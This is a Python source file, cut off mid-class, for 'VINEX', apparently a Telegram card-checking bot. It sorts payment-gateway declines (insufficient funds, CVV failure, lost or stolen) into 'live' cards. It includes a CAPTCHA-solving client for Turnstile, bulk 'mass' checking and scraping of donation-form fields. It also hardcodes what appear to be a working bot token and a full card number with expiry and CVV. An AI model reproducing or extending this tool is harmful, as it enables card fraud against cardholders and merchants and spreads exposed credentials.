#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════════╗
# ║   VINEX v25.0 — Ultimate Edition                             ║
# ║   Live Gateway logic (from user's working script)            ║
# ║   + v24 parallel + cache + mass + capture                    ║
# ╚══════════════════════════════════════════════════════════════╝
import telebot
from telebot import types
import telebot.apihelper
import time, threading, os, re, json, base64, random
import logging, tempfile, gzip, zlib, codecs, html, binascii
import struct, socket, hashlib
from string import Template
from collections import defaultdict
from urllib.parse import urlparse, unquote, parse_qsl, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    import brotli
    _HAS_BROTLI = True
except Exception:
    _HAS_BROTLI = False

try:
    from fake_useragent import UserAgent
    _UU = UserAgent(fallback='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120')
    def rand_ua():
        try: return _UU.random
        except: return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120'
except Exception:
    def rand_ua(): return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120'

telebot.apihelper.CONNECT_TIMEOUT = 30
telebot.apihelper.READ_TIMEOUT = 180

# ═══════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════
TOKEN = os.getenv('BOT_TOKEN', '8689698569:AAE2IwjZCmkYpMqyBgPVuX19zuf2YhN-Ah8')
OWNER_ID = int(os.getenv('OWNER_ID', '6843321125'))
ADMINS = {str(OWNER_ID)}

USERS_FILE = 'users.txt'
BLOCK_FILE = 'blockusers.txt'
STATS_FILE = 'stats.json'
PROGRESS_TMPL = 'progress_{}.json'
RESULTS_TMPL = 'vinex_results_{}_{}.txt'
LIVE_DIR_TMPL = 'vinex_live_{}_{}'

MAX_FILE_SIZE = 10 * 1024 * 1024
PAYPAL_COOLDOWN = 3
MASS_COOLDOWN = 10
LINK_COOLDOWN = 30
PROGRESS_SAVE_EVERY = 5
STATUS_UPDATE_EVERY = 2.0
CLEANUP_OLDER_THAN_DAYS = 7

BASE_AMOUNTS = ['1.00', '3.00', '5.00']
TEST_CARD = os.getenv('TEST_CARD', '4059986126444431|11|30|947')

TS_API_URL = os.getenv('TS_API_URL', '').rstrip('/')
TS_API_KEY = os.getenv('TS_API_KEY', '')

EFFECT_FIRE = '5104841245755180586'
EFFECT_HEART = '5046509860389126442'
EFFECT_CELEBRATE = '5046589136895476101'
EFFECT_THUMBS = '5107584321108051014'

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler('vinex.log', encoding='utf-8'), logging.StreamHandler()],
)
log = logging.getLogger('vinex')
bot = telebot.TeleBot(TOKEN, parse_mode='HTML')

_STATS_LOCK = threading.Lock()
_PROGRESS_LOCK = threading.Lock()

# ═══════════════════════════════════════════════════════════════
#  LIVE RESPONSES — مأخوذة حرفيًا من السكريبت الشغّال
# ═══════════════════════════════════════════════════════════════
LIVE_RESPONSES = [
    'CHARGE', 'Payer cannot pay for this transaction',
    'INSTRUMENT_DECLINED', 'ORDER_NOT_APPROVED', 'PAYER_ACTION_REQUIRED',
    'PAYER_CANNOT_PAY', 'PAYMENT_DENIED', 'PAYEE_ACCOUNT_RESTRICTED',
    'PAYEE_NOT_CONSENTED', 'PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING',
    'PERMISSION_DENIED', 'POSTAL_CODE_REQUIRED', 'REFERENCED_CARD_EXPIRED',
    'CARD_EXPIRED', 'AMOUNT_MISMATCH', 'DUPLICATE_INVOICE_ID',
    'INVALID_RESOURCE_ID', 'ITEM_TOTAL_MISMATCH',
    'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED',
    'ORDER_ALREADY_AUTHORIZED', 'ORDER_ALREADY_CAPTURED',
    'REDIRECT_PAYER_FOR_ALTERNATE_FUNDING', 'VALIDATION_ERROR',
    'UNPROCESSABLE_ENTITY',
    'DO_NOT_HONOR', 'GENERIC_DECLINE', 'CVV2_FAILURE', 'CVV_FAILURE',
    'INSUFFICIENT_FUNDS', 'INVALID_PIN', 'CARD_CLOSED',
    'PICKUP_CARD_SPECIAL_CONDITIONS', 'UNAUTHORIZED_USER', 'AVS_FAILURE',
    'INVALID_OR_RESTRICTED_CARD', 'SOFT_AVS', 'DUPLICATE_TRANSACTION',
    'INVALID_TRANSACTION', 'EXPIRED_CARD', 'INVALID_DATA_FORMAT',
    'INVALID_AMOUNT', 'INVALID_ACCOUNT', 'INVALID_MERCHANT',
    'TRANSACTION_CANNOT_BE_COMPLETED', 'REVERSAL_REJECTED',
    'ISSUER_NOT_AVAILABLE_NOT_RETRIABLE', 'ISSUER_NOT_AVAILABLE_RETRIABLE',
    'AUTHENTICATION_FAILED', 'BIN_ERROR', 'PIN_ERROR',
    'SENDING_LIMIT_EXCEEDED', 'TRANSACTION_RECEIVING_LIMIT_EXCEEDED',
    'CURRENCY_MISMATCH', 'INVALID_ACCOUNT_STATUS',
    'REJECTED_DUE_TO_RISK_REVERSAL', 'TRANSACTION_REFUSED',
    'INTERNAL_SERVER_ERROR', 'INVALID_REQUEST', 'AUTHENTICATION_FAILURE',
    'NOT_AUTHORIZED', 'RESOURCE_NOT_FOUND',
    'PAYER_ACCOUNT_RESTRICTED', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
    'PAYEE_BLOCKED_TRANSACTION', 'SUSPECTED_FRAUD', 'ACCOUNT_CLOSED',
    'PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'LOST_OR_STOLEN',
    'COMPLIANCE_VIOLATION', 'CAPTURE_DECLINED', 'AUTHORIZATION_DENIED',
    'CRYPTOGRAPHIC_FAILURE', 'TX_ATTEMPTS_EXCEED_LIMIT', 'DECLINED',
    'REATTEMPT_NOT_PERMITTED', 'ACCOUNT_BLOCKED_BY_ISSUER',
    'TRANSACTION_NOT_PERMITTED', 'SECURITY_VIOLATION',
    'DECLINED_DUE_TO_UPDATED_ACCOUNT', 'DECLINED_PLEASE_RETRY',
    'For Visa, Mastercard', 'nothing matches',
    'address and postal code are both incorrect',
    'CVV2/CSC does not match',
    'account closed as fraudulent',
    'The requested action could not be performed',
    'Payer has not yet approved the Order',
    'Please redirect the payer',
    'provide a valid payment_source',
]

# ═══════════════════════════════════════════════════════════════
#  FONTS
# ═══════════════════════════════════════════════════════════════
def _bold(s):
    r = []
    for c in s:
        o = ord(c)
        if 0x41 <= o <= 0x5A: r.append(chr(0x1D400 + o - 0x41))
        elif 0x61 <= o <= 0x7A: r.append(chr(0x1D41A + o - 0x61))
        elif 0x30 <= o <= 0x39: r.append(chr(0x1D7CE + o - 0x30))
        else: r.append(c)
    return ''.join(r)

def _sb(s):
    r = []
    for c in s:
        o = ord(c)
        if 0x41 <= o <= 0x5A: r.append(chr(0x1D5D4 + o - 0x41))
        elif 0x61 <= o <= 0x7A: r.append(chr(0x1D5EE + o - 0x61))
        elif 0x30 <= o <= 0x39: r.append(chr(0x1D7EC + o - 0x30))
        else: r.append(c)
    return ''.join(r)

B = _bold
SB = _sb

# ═══════════════════════════════════════════════════════════════
#  EMOJI PACK
# ═══════════════════════════════════════════════════════════════
VINEX_CE = {
    'warn':       ('5420323339723881652', '⚠️'),
    'globe':      ('5447410659077661506', '🌐'),
    'play':       ('5264919878082509254', '▶️'),
    'ban':        ('5240241223632954241', '🚫'),
    'sound':      ('5388632425314140043', '🔊'),
    'party':      ('6039789659691688114', '🎉'),
    'cash':       ('5197434882321567830', '💵'),
    'smile':      ('6150116924165461974', '😊'),
    'moneybag':   ('6125337376639161874', '💰'),
    'laugh':      ('5352615886131831104', '😆'),
    'gear':       ('5929098607192969118', '⚙'),
    'circle':     ('5933844889652432294', '⚪'),
    'stop':       ('5260293700088511294', '⛔'),
    'scream':     ('5222466772061436244', '😱'),
    'gift':       ('6026316531967726726', '🎁'),
    'record':     ('6026056450223116307', '⏺'),
    'moneywings': ('5231449120635370684', '💸'),
    'shop':       ('5229064374403998351', '🛍'),
    'soon':       ('5440621591387980068', '🔜'),
    'pause':      ('5359543311897998264', '⏸'),
    'shield':     ('5197288647275071607', '🛡'),
    'money2':     ('6122682287986317242', '💸'),
    'grimace':    ('6125216237086579378', '😬'),
    'blue_bolt':  ('5836917983271722591', '🔵'),
    'rocket':     ('5836917983271722591', '🚀'),
}

def ve(name):
    if name not in VINEX_CE: return ''
    cid, fb = VINEX_CE[name]
    return f'<tg-emoji emoji-id="{cid}">{fb}</tg-emoji>'

def vt(label, value):
    return f'[⚡] {B(label)}: {value}'

def vsep():
    return '- ' * 22

def vinex_btn(label, style='primary', emoji_name=None, **kwargs):
    kw = dict(kwargs)
    if style in ('success', 'primary', 'danger'):
        kw['style'] = style
    if emoji_name and emoji_name in VINEX_CE:
        kw['icon_custom_emoji_id'] = VINEX_CE[emoji_name][0]
    try:
        return types.InlineKeyboardButton(text=label, **kw)
    except TypeError:
        kw.pop('style', None)
        kw.pop('icon_custom_emoji_id', None)
        return types.InlineKeyboardButton(text=label, **kw)

def vinex_header(subtitle=''):
    lines = [
        '╔══════════════════════════╗',
        f'║  {ve("party")} <b>VINEX</b> {ve("party")}  ║',
        f'║  <i>Scanner v25.0</i>  ║',
        '╚══════════════════════════╝',
    ]
    if subtitle:
        lines.append(f'<b>▸ {subtitle}</b>')
    return '\n'.join(lines)

def playful(kind):
    pool = {
        'start':   ['🚀', '🎯', '⚡', '🔥'],
        'working': ['⚙️', '🔄', '🧠', '⚡', '🌀'],
        'success': ['🎉', '✨', '💫', '🎊', '🏆'],
        'dead':    ['💀', '😴', '🥀', '❌'],
        'live':    ['💎', '💚', '💛', '🏆'],
        'error':   ['⚠️', '🚨', '💢'],
        'fun':     ['😎', '🤙', '👑', '🦾', '😏'],
    }
    return random.choice(pool.get(kind, ['•']))

# ═══════════════════════════════════════════════════════════════
#  TURNSTILE SOLVER
# ═══════════════════════════════════════════════════════════════
class TurnstileSolver:
    def __init__(self):
        self.api_url = TS_API_URL
        self.api_key = TS_API_KEY
        self.enabled = bool(self.api_url and self.api_key)
        if self.enabled:
            log.info(f'TurnstileSolver ready: {self.api_url}')
        else:
            log.info('TurnstileSolver disabled (no env vars)')

    def solve(self, page_url, sitekey, timeout=90):
        if not self.enabled:
            return None
        try:
            r = requests.post(
                f'{self.api_url}/turnstile',
                headers={'x-api-key': self.api_key,
                         'Content-Type': 'application/json'},
                json={'url': page_url, 'sitekey': sitekey},
                timeout=20,
            )
            if r.status_code != 200:
                log.warning(f'Turnstile create HTTP {r.status_code}')
                return None
            tid = r.json().get('task_id')
            if not tid:
                return None
            log.info(f'Turnstile task: {tid}')
            end = time.time() + timeout
            while time.time() < end:
                r = requests.get(
                    f'{self.api_url}/result/{tid}',
                    headers={'x-api-key': self.api_key},
                    timeout=20,
                )
                if r.status_code == 202:
                    time.sleep(2)
                    continue
                if r.status_code == 200:
                    token = r.json().get('token')
                    if token:
                        log.info(f'Turnstile solved ({len(token)} chars)')
                        return token
                return None
        except Exception as e:
            log.warning(f'Turnstile solve: {type(e).__name__}')
            return None

_turnstile = TurnstileSolver()

# ═══════════════════════════════════════════════════════════════
#  STATE + FILES
# ═══════════════════════════════════════════════════════════════
waiting_users = {}
reply_mode = {}
mass_active = {}
mass_pause = {}
mass_shared = {}
user_last_paypal = defaultdict(float)
user_last_mass = defaultdict(float)
link_cooldowns = {}

for _f in (USERS_FILE, BLOCK_FILE):
    try:
        if not os.path.exists(_f): open(_f, 'w', encoding='utf-8').close()
    except: pass

def save_user(uid):
    try:
        uids = open(USERS_FILE, 'r', encoding='utf-8').read().splitlines()
        if str(uid) not in uids:
            with open(USERS_FILE, 'a', encoding='utf-8') as f: f.write(f'{uid}\n')
    except: pass

def is_blocked(uid):
    try:
        return str(uid) in [l.strip() for l in open(BLOCK_FILE, 'r', encoding='utf-8').read().splitlines() if l.strip()]
    except: return False

def load_stats():
    try:
        with _STATS_LOCK:
            return json.load(open(STATS_FILE, 'r', encoding='utf-8'))
    except: return {'checks': 0, 'live': 0, 'dead': 0}

def save_stats(st):
    try:
        with _STATS_LOCK:
            json.dump(st, open(STATS_FILE, 'w', encoding='utf-8'))
    except: pass

def bump_stat(k):
    try:
        s = load_stats(); s[k] = s.get(k, 0) + 1; save_stats(s)
    except: pass

def save_progress(uid, data):
    try:
        with _PROGRESS_LOCK:
            fd, tmp = tempfile.mkstemp(dir='.', suffix='.json')
            with os.fdopen(fd, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False)
            os.replace(tmp, PROGRESS_TMPL.format(uid))
    except: pass

def load_progress(uid):
    try:
        with _PROGRESS_LOCK:
            p = PROGRESS_TMPL.format(uid)
            if not os.path.exists(p): return None
            d = json.load(open(p, 'r', encoding='utf-8'))
            if not isinstance(d, dict): return None
            if not isinstance(d.get('links'), list) or not d['links']: return None
            d.setdefault('processed', 0)
            d.setdefault('live', 0)
            d.setdefault('dead', 0)
            d.setdefault('total', len(d['links']))
            d.setdefault('started_at', time.time())
            return d
    except: return None

def clear_progress(uid):
    try:
        with _PROGRESS_LOCK:
            os.remove(PROGRESS_TMPL.format(uid))
    except: pass

def cleanup_old_files():
    try:
        cutoff = time.time() - CLEANUP_OLDER_THAN_DAYS * 86400
        for n in os.listdir('.'):
            if n.startswith(('vinex_results_', 'vinex_live_')):
                p = os.path.join('.', n)
                if os.path.isfile(p) and os.path.getmtime(p) < cutoff: os.remove(p)
    except: pass

# ═══════════════════════════════════════════════════════════════
#  URL + DEDUP
# ═══════════════════════════════════════════════════════════════
_URL_RE = re.compile(
    r'^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?'
    r'(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*'
    r'\.[a-zA-Z]{2,}$'
)

def safe_url(link):
    try:
        if not link or not isinstance(link, str): return None
        link = link.strip().strip('"\'` \t\r\n')
        while link and link[-1] in '.,;:!?)]}\'"': link = link[:-1]
        if len(link) < 8: return None
        low = link.lower()
        if '://none' in low or 'invalid.local' in low: return None
        if not link.startswith(('http://', 'https://')): link = 'https://' + link.lstrip('/')
        p = urlparse(link)
        if not p.netloc or not p.netloc.strip(): return None
        host = p.netloc.split(':')[0].split('@')[-1].rstrip('.')
        if not host or not _URL_RE.match(host):
            if not host.startswith('xn--') and 'xn--' not in host:
                return None
        return link
    except: return None

def normalize_url_key(url):
    try:
        if not url: return ''
        p = urlparse(url.lower().strip())
        host = p.netloc.replace('www.', '').rstrip('.')
        path = p.path.rstrip('/') or '/'
        q = p.query.strip()
        return f'{host}{path}?{q}' if q else f'{host}{path}'
    except: return str(url).lower().strip()

# ═══════════════════════════════════════════════════════════════
#  TELEGRAM HELPERS
# ═══════════════════════════════════════════════════════════════
def retry_call(func, *args, retries=4, delays=(2, 4, 8, 16), **kw):
    last = None
    for i in range(retries):
        try: return func(*args, **kw)
        except Exception as e:
            last = e
            err = str(e).lower()
            if any(x in err for x in ('invalid file_id', 'file is too big', 'wrong file_id', 'not found')):
                raise
            if i < retries - 1: time.sleep(delays[i] if i < len(delays) else delays[-1])
    raise last

def safe_send_message(cid, text, retries=3, reply_markup=None, parse_mode='HTML', effect=None):
    for i in range(retries):
        try:
            kw = {'chat_id': cid, 'text': text, 'parse_mode': parse_mode,
                  'reply_markup': reply_markup, 'disable_web_page_preview': True}
            if effect:
                try: kw['message_effect_id'] = effect
                except: pass
            return bot.send_message(**kw)
        except Exception as e:
            err = str(e)
            if '429' in err:
                try: w = int(err.split('retry after ')[1].split(')')[0])
                except: w = 30
                time.sleep(min(w, 60)); continue
            if 'effect' in err.lower() or 'unknown field' in err.lower():
                kw.pop('message_effect_id', None)
                try: return bot.send_message(**kw)
                except: pass
            if "can't parse" in err.lower() or 'bad request' in err.lower():
                try:
                    return bot.send_message(cid, re.sub(r'<[^>]+>', '', text)[:4000],
                                            reply_markup=reply_markup,
                                            disable_web_page_preview=True)
                except: return None
            if i < retries - 1: time.sleep(1)
    return None

def safe_edit_message(cid, mid, text, retries=3):
    for i in range(retries):
        try:
            return bot.edit_message_text(chat_id=cid, message_id=mid, text=text,
                                          parse_mode='HTML', disable_web_page_preview=True)
        except Exception as e:
            err = str(e)
            if 'not modified' in err: return None
            if '429' in err:
                try: w = int(err.split('retry after ')[1].split(')')[0])
                except: w = 30
                time.sleep(min(w, 60)); continue
            if "can't parse" in err.lower():
                try:
                    return bot.edit_message_text(chat_id=cid, message_id=mid,
                                                  text=re.sub(r'<[^>]+>', '', text)[:4000])
                except: return None
            if i < retries - 1: time.sleep(1)
    return None

def safe_send_document(cid, path, caption='', retries=3):
    try:
        if not os.path.exists(path): return None
    except: return None
    for attempt in range(3):
        try:
            with open(path, 'rb') as f:
                kw = {'chat_id': cid, 'document': f, 'timeout': 180}
                if attempt == 0:
                    kw['caption'] = caption; kw['parse_mode'] = 'HTML'
                elif attempt == 1:
                    kw['caption'] = re.sub(r'<[^>]+>', '', caption)[:1024]
                return bot.send_document(**kw)
        except Exception as e:
            err = str(e)
            if '429' in err:
                try: w = int(err.split('retry after ')[1].split(')')[0])
                except: w = 30
                time.sleep(min(w, 60)); continue
            continue
    return None

def react_to(message, emoji='👍'):
    try:
        bot.set_message_reaction(chat_id=message.chat.id, message_id=message.message_id,
                                  reaction=[{'type': 'emoji', 'emoji': emoji}], is_big=False)
        return True
    except: return False

def show_typing(cid, action='typing', duration=2.0):
    try:
        bot.send_chat_action(cid, action)
        def r():
            try:
                end = time.time() + duration
                while time.time() < end:
                    time.sleep(4)
                    if time.time() < end: bot.send_chat_action(cid, action)
            except: pass
        threading.Thread(target=r, daemon=True).start()
    except: pass

def send_dice(cid, emoji='🎲'):
    try: return bot.send_dice(cid, emoji=emoji)
    except: return None

# ═══════════════════════════════════════════════════════════════
#  RESPONSE EXTRACTOR
# ═══════════════════════════════════════════════════════════════
def extract_response_text(body):
    if not body: return ''
    s = str(body).strip()
    if not s: return ''
    try: j = json.loads(s)
    except: j = None

    def _find(obj, depth=0):
        if depth > 4 or obj is None: return None
        if isinstance(obj, str):
            if obj.strip().lower() in ('none', 'null', 'false', ''): return None
            return obj[:300]
        if isinstance(obj, (int, float)): return str(obj)[:300]
        if isinstance(obj, list):
            for i in obj:
                r = _find(i, depth + 1)
                if r: return r
            return None
        if isinstance(obj, dict):
            det = obj.get('details')
            if isinstance(det, list) and det:
                for x in det:
                    if isinstance(x, dict):
                        for k in ('description', 'issue', 'reason', 'message'):
                            v = x.get(k)
                            if v and str(v).strip().lower() not in ('none', 'null', ''):
                                return str(v)[:300]
            for k in ('description', 'message', 'error_description', 'error', 'msg', 'reason', 'detail', 'status'):
                if k in obj:
                    v = obj[k]
                    if isinstance(v, dict):
                        r = _find(v, depth + 1)
                        if r: return r
                    elif v and str(v).strip().lower() not in ('none', 'null', 'false', ''):
                        return str(v)[:300]
            if 'data' in obj:
                r = _find(obj['data'], depth + 1)
                if r: return r
            if 'name' in obj and isinstance(obj['name'], str):
                n = obj['name']
                if n.upper() not in ('UNPROCESSABLE_ENTITY', 'INVALID_REQUEST', 'VALIDATION_ERROR'):
                    return n[:300]
        return None

    if j is not None:
        r = _find(j)
        if r: return r
    return s[:300]

# ═══════════════════════════════════════════════════════════════
#  OPTION FILTER
# ═══════════════════════════════════════════════════════════════
_JUNK = ['give-', 'screen-reader', 'give-label', 'give-required', 'give-where', 'give_price', 'give-form-']
_JUNK_E = {'true', 'false', 'none', 'null', 'selected', 'disabled', 'required'}

def is_valid_option(opt):
    if not opt or not isinstance(opt, str): return False
    o = opt.strip()
    if not o: return False
    lo = o.lower()
    if lo in _JUNK_E: return False
    for p in _JUNK:
        if p in lo: return False
    if len(o) > 60 or o.startswith(('{', '[', '<')): return False
    return True

# ═══════════════════════════════════════════════════════════════
#  CLASSIFICATION
# ═══════════════════════════════════════════════════════════════
def is_live_response(r):
    if not r: return False
    up = str(r).upper()
    for kw in LIVE_RESPONSES:
        if kw.upper() in up:
            return True
    return False

def normalize_result(r):
    if not r: return 'DECLINED'
    s = str(r)
    up = s.upper()
    if 'ORDER_NOT_APPROVED' in up or 'PAYER_CANNOT_PAY' in up \
       or 'Payer has not yet approved' in s or 'Payer cannot pay' in s:
        return 'Payer cannot pay for this transaction.'
    return s[:250]

PRIORITY = [
    ('CHARGE', 200), ('INSUFFICIENT_FUNDS', 195),
    ('INVALID_OR_RESTRICTED_CARD', 190), ('TRANSACTION_NOT_PERMITTED', 188),
    ('Payer cannot pay', 185), ('PAYER_CANNOT_PAY', 185), ('ORDER_NOT_APPROVED', 185),
    ('INSTRUMENT_DECLINED', 182), ('PAYMENT_DENIED', 180),
    ('SUSPECTED_FRAUD', 178), ('CVV2_FAILURE', 175), ('CVV_FAILURE', 175),
    ('EXPIRED_CARD', 172), ('DO_NOT_HONOR', 170),
    ('RESTRICTED_OR_INACTIVE_ACCOUNT', 168),
    ('ACCOUNT_CLOSED', 166), ('LOST_OR_STOLEN', 164),
    ('GENERIC_DECLINE', 155), ('TRANSACTION_REFUSED', 153), ('DECLINED', 100),
]

def score_result(r):
    if not r: return 0
    up = str(r).upper()
    for k, s in PRIORITY:
        if k.upper() in up: return s
    return 1

# ═══════════════════════════════════════════════════════════════
#  DECODE ENGINE v2
# ═══════════════════════════════════════════════════════════════
class DecodeEngine:
    @staticmethod
    def _clean(s):
        try:
            if not isinstance(s, str): return None
            s = s.strip()
            if not s: return None
            return s
        except: return None

    @staticmethod
    def b64(s):
        try:
            r = base64.b64decode(s + '=' * (-len(s) % 4), validate=False)
            return r.decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def b64_url(s):
        try:
            r = base64.urlsafe_b64decode(s + '=' * (-len(s) % 4))
            return r.decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def b32(s):
        try:
            return base64.b32decode(s + '=' * (-len(s) % 8)).decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def b32hex(s):
        try:
            return base64.b32hexdecode(s + '=' * (-len(s) % 8)).decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def b16(s):
        try:
            cl = re.sub(r'[^0-9a-fA-F]', '', s)
            if len(cl) < 10 or len(cl) % 2: return None
            return bytes.fromhex(cl).decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def b85(s):
        try:
            return base64.b85decode(s).decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def a85(s):
        try:
            return base64.a85decode(s).decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def url_dec(s):
        try:
            if '%' not in s: return None
            r = unquote(s)
            return r if r != s else None
        except: return None

    @staticmethod
    def url_dec_plus(s):
        try:
            if '%' not in s and '+' not in s: return None
            r = unquote(s.replace('+', ' '))
            return r if r != s else None
        except: return None

    @staticmethod
    def html_ent(s):
        try:
            if '&' not in s or ';' not in s: return None
            r = html.unescape(s)
            return r if r != s else None
        except: return None

    @staticmethod
    def unicode_esc(s):
        try:
            if '\\u' not in s and '\\x' not in s: return None
            def _repl_u(m):
                try: return chr(int(m.group(1), 16))
                except: return m.group(0)
            def _repl_x(m):
                try: return chr(int(m.group(1), 16))
                except: return m.group(0)
            out = re.sub(r'\\u([0-9a-fA-F]{4})', _repl_u, s)
            out = re.sub(r'\\x([0-9a-fA-F]{2})', _repl_x, out)
            return out if out != s else None
        except: return None

    @staticmethod
    def rot13(s):
        try: return codecs.decode(s, 'rot_13')
        except: return None

    @staticmethod
    def rot47(s):
        try:
            out = []
            for c in s:
                o = ord(c)
                if 33 <= o <= 126: out.append(chr(33 + ((o - 33 + 14) % 94)))
                else: out.append(c)
            return ''.join(out)
        except: return None

    @staticmethod
    def rot_n(s):
        results = []
        try:
            for n in range(1, 26):
                if n == 13: continue
                out = []
                for c in s:
                    o = ord(c)
                    if 65 <= o <= 90: out.append(chr(65 + (o - 65 + n) % 26))
                    elif 97 <= o <= 122: out.append(chr(97 + (o - 97 + n) % 26))
                    else: out.append(c)
                results.append(''.join(out))
        except: pass
        return results

    @staticmethod
    def atbash(s):
        try:
            out = []
            for c in s:
                o = ord(c)
                if 65 <= o <= 90: out.append(chr(90 - (o - 65)))
                elif 97 <= o <= 122: out.append(chr(122 - (o - 97)))
                else: out.append(c)
            return ''.join(out)
        except: return None

    @staticmethod
    def reverse(s):
        try: return s[::-1]
        except: return None

    @staticmethod
    def jwt_payload(s):
        try:
            if not isinstance(s, str) or s.count('.') != 2: return None
            parts = s.split('.')
            if not parts[0].startswith('eyJ'): return None
            p = parts[1] + '=' * (-len(parts[1]) % 4)
            return base64.urlsafe_b64decode(p).decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def jwt_header(s):
        try:
            if not isinstance(s, str) or s.count('.') != 2: return None
            parts = s.split('.')
            if not parts[0].startswith('eyJ'): return None
            p = parts[0] + '=' * (-len(parts[0]) % 4)
            return base64.urlsafe_b64decode(p).decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def gzip_dec(s):
        try:
            if isinstance(s, str):
                try: s = base64.b64decode(s + '=' * (-len(s) % 4))
                except: return None
            if not isinstance(s, (bytes, bytearray)): return None
            if s[:2] != b'\x1f\x8b': return None
            return gzip.decompress(s).decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def zlib_dec(s):
        try:
            if isinstance(s, str):
                try: s = base64.b64decode(s + '=' * (-len(s) % 4))
                except: return None
            if not isinstance(s, (bytes, bytearray)): return None
            return zlib.decompress(s).decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def deflate_dec(s):
        try:
            if isinstance(s, str):
                try: s = base64.b64decode(s + '=' * (-len(s) % 4))
                except: return None
            if not isinstance(s, (bytes, bytearray)): return None
            return zlib.decompress(s, -zlib.MAX_WBITS).decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def brotli_dec(s):
        if not _HAS_BROTLI: return None
        try:
            if isinstance(s, str):
                try: s = base64.b64decode(s + '=' * (-len(s) % 4))
                except: return None
            if not isinstance(s, (bytes, bytearray)): return None
            return brotli.decompress(s).decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def xor_brute(s):
        try:
            if not isinstance(s, str) or len(s) < 20: return []
            raw = s.encode('utf-8', errors='ignore')
            outs = []
            for key in range(1, 256):
                try:
                    dec = bytes(b ^ key for b in raw)
                    printable = sum(1 for c in dec if 32 <= c < 127 or c in (9, 10, 13))
                    if printable / len(dec) > 0.85:
                        t = dec.decode('utf-8', errors='ignore')
                        if any(k in t for k in ('{', 'token', 'client', 'key', 'id', 'http')):
                            outs.append(t)
                except: continue
            return outs
        except: return []

    @staticmethod
    def quoted_printable(s):
        try:
            if '=' not in s: return None
            import quopri
            r = quopri.decodestring(s.encode('utf-8', errors='ignore')).decode('utf-8', errors='ignore')
            return r if r != s else None
        except: return None

    @staticmethod
    def punycode_dec(s):
        try:
            if not s.startswith('xn--'): return None
            return s.encode('ascii').decode('idna')
        except: return None

    @staticmethod
    def utf16_dec(s):
        try:
            if isinstance(s, str):
                b = s.encode('latin-1', errors='ignore')
            else:
                b = bytes(s)
            outs = []
            for enc in ('utf-16-le', 'utf-16-be'):
                try:
                    outs.append(b.decode(enc, errors='ignore'))
                except: pass
            return outs if outs else None
        except: return None

    @staticmethod
    def base64_json(s):
        try:
            if not isinstance(s, str) or len(s) < 20: return None
            r = base64.b64decode(s + '=' * (-len(s) % 4), validate=False)
            try:
                return r.decode('utf-8', errors='ignore')
            except: return None
        except: return None

    @classmethod
    def decode_chain(cls, s, max_depth=4):
        s = cls._clean(s)
        if not s: return []
        methods = [
            cls.b64, cls.b64_url, cls.b32, cls.b32hex, cls.b16,
            cls.b85, cls.a85, cls.url_dec, cls.url_dec_plus, cls.html_ent,
            cls.unicode_esc, cls.rot13, cls.rot47, cls.atbash, cls.reverse,
            cls.jwt_payload, cls.jwt_header, cls.gzip_dec, cls.zlib_dec,
            cls.deflate_dec, cls.brotli_dec, cls.quoted_printable,
            cls.punycode_dec, cls.base64_json,
        ]
        results = [s]
        seen = {s}
        frontier = [s]
        for _ in range(max_depth):
            new_f = []
            for item in frontier:
                for m in methods:
                    try:
                        r = m(item)
                        if isinstance(r, list):
                            for x in r:
                                if x and x not in seen and len(x) > 4:
                                    seen.add(x); results.append(x); new_f.append(x)
                            continue
                        if r and r != item and len(r) > 4 and r not in seen:
                            seen.add(r); results.append(r); new_f.append(r)
                    except: continue
                try:
                    for x in cls.xor_brute(item)[:3]:
                        if x and x not in seen and len(x) > 4:
                            seen.add(x); results.append(x); new_f.append(x)
                except: pass
                try:
                    for x in cls.rot_n(item)[:3]:
                        if x and x not in seen and len(x) > 4:
                            seen.add(x); results.append(x); new_f.append(x)
                except: pass
            if not new_f: break
            frontier = new_f[:30]
        return results

# ═══════════════════════════════════════════════════════════════
#  EXTRACTOR ENGINE v2
# ═══════════════════════════════════════════════════════════════
class ExtractorEngine:
    @staticmethod
    def from_comments(h): return [m.group(1) for m in re.finditer(r'<!--(.*?)-->', h, re.DOTALL)]
    @staticmethod
    def from_data(h): return [m.group(1) for m in re.finditer(r'data-[\w-]+=["\']([^"\']{12,})["\']', h, re.I)]
    @staticmethod
    def from_json_scripts(h):
        return [m.group(1) for m in re.finditer(
            r'<script[^>]*type=["\']application/(?:ld\+)?json["\'][^>]*>(.*?)</script>',
            h, re.DOTALL | re.I)]
    @staticmethod
    def from_js(h):
        return [m.group(1) for m in re.finditer(
            r'<script(?![^>]*\bsrc=)[^>]*>(.*?)</script>', h, re.DOTALL | re.I)]
    @staticmethod
    def from_meta(h): return [m.group(1) for m in re.finditer(r'<meta[^>]+content=["\']([^"\']{12,})["\']', h, re.I)]
    @staticmethod
